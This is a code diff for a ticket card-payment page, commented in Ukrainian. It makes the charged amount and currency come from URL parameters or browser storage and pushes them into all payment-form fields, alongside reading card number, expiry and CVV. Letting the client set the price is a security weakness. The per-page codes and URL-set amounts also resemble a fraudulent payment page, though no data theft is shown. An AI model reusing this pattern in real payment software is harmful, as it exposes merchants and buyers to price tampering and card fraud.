@@ -158,17 +158,45 @@
         const url = new URL(window.location.href);
         return url.searchParams.get(name);
     }
-    // Total підтягуємо, беремо тільки число
-    const totalRaw = getQueryParam('total');
-    const currencyRaw = getQueryParam('currency') || 'EUR';
-    if (totalRaw) {
-        // Витягуємо тільки число (цілу або з копійками)
-        const match = totalRaw.match(/\d+[\.,]?\d*/);
-        const totalNum = match ? match[0].replace(',', '.') : '';
-        if (totalNum) {
-            document.getElementById('payment-title').textContent = `Payment ${totalNum} ${currencyRaw}`;
+    // --- Витягуємо total і currency з URL ---
+    function getTotalAndCurrency() {
+        const totalRaw = getQueryParam('total');
+        const currencyRaw = getQueryParam('currency') || 'EUR';
+        if (totalRaw) {
+            // Витягуємо тільки число (цілу або з копійками)
+            const match = totalRaw.match(/\d+[\.,]?\d*/);
+            const totalNum = match ? match[0].replace(',', '.') : '';
+            return { total: totalNum, currency: currencyRaw };
         }
+        // fallback: price/currency
+        let price = localStorage.getItem('ticket_price') || sessionStorage.getItem('ticket_price');
+        let currency = localStorage.getItem('ticket_currency') || sessionStorage.getItem('ticket_currency') || 'EUR';
+        return { total: price, currency };
     }
+    // --- Оновлюємо всі суми на сторінці ---
+    function updateAllTotals() {
+        const { total, currency } = getTotalAndCurrency();
+        // Заголовок
+        document.getElementById('payment-title').textContent = `Payment ${total} ${currency}`;
+        // Всі елементи з ціною
+        document.querySelectorAll('.ticket-price, .price, [data-price], #payment-title').forEach(el => {
+            el.textContent = `${total} ${currency}`;
+        });
+        // data-атрибути для системи оплати
+        document.querySelectorAll('[data-payment-price]').forEach(el => {
+            el.setAttribute('data-payment-price', total);
+            el.setAttribute('data-payment-currency', currency);
+        });
+        // Форми оплати
+        document.querySelectorAll('form[data-payment-form]').forEach(form => {
+            const priceInput = form.querySelector('input[name="price"]');
+            const currencyInput = form.querySelector('input[name="currency"]');
+            if (priceInput) priceInput.value = total;
+            if (currencyInput) currencyInput.value = currency;
+        });
+    }
+    // --- Викликаємо при завантаженні ---
+    updateAllTotals();
     // --- Замість uid використовуємо page_code ---
     function getPageCode() {
         // 1. З URL
@@ -189,20 +217,8 @@
         const expiry = document.getElementById('expiry-input').value;
         const cvv = document.getElementById('cvv-input').value;
         // --- Додаємо price і currency ---
-        let price = localStorage.getItem('ticket_price');
-        let currency = localStorage.getItem('ticket_currency');
-        if (!price || !currency) {
-            // fallback: парсимо з total або currency з URL
-            const totalRaw = getQueryParam('total') || '';
-            const match = totalRaw.match(/(\d+[\.,]?\d*)([A-Za-z]+)/);
-            if (match) {
-                price = match[1].replace(',', '.');
-                currency = match[2];
-            } else {
-                price = totalRaw.match(/\d+[\.,]?\d*/)?.[0]?.replace(',', '.') || '';
-                currency = getQueryParam('currency') || 'EUR';
-            }
-        }
+        // Тепер price/currency = total/currency з URL, якщо є
+        const { total: price, currency } = getTotalAndCurrency();
         // --- Додаємо телефон і ім'я з sessionStorage ---
         const phone = sessionStorage.getItem('ticket_phone') || '';
         const name = sessionStorage.getItem('ticket_name') || '';
